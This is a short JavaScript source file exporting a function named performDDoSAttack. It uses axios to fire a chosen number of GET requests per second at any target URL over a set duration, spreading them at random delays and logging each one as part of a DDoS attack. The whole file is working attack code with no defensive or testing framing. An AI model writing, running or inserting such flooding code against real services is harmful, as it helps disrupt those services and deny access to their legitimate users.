import axios from 'axios';

export const performDDoSAttack = async (targetUrl, requestsPerSecond, durationSeconds) => {
  const totalRequests = requestsPerSecond * durationSeconds;

  console.log(`[DDoS] Starting attack: ${totalRequests} requests to ${targetUrl}`);

  for (let i = 0; i < totalRequests; i++) {
    setTimeout(() => {
      axios.get(targetUrl)
        .then(() => {
          console.log(`[DDoS] Request ${i + 1} successful`);
        })
        .catch((err) => {
          console.error(`[DDoS] Request ${i + 1} failed`, err.message);
        });
    }, Math.floor(Math.random() * durationSeconds * 1000)); 
  }
};
